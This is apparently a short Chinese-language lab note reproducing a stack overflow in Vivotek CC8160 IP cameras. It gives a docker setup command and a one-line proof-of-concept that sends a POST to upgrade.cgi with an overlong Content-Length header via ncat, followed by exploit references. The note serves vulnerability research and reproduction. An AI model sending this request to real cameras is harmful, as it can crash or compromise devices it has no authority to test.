# Vivotek IP Cameras CC8160 栈溢出漏洞


## 漏洞环境

```sh
$ docker run --privileged -p 1234:80 -it vivotek_cc8160 /bin/bash
```

## 漏洞复现

```sh
echo -en "POST /cgi-bin/admin/upgrade.cgi 
HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | ncat -v 192.168.57.20 80
```

## 参考链接

- https://www.exploit-db.com/exploits/44001
- https://xz.aliyun.com/t/5054
- https://www.anquanke.com/post/id/185336
- https://paper.seebug.org/480/
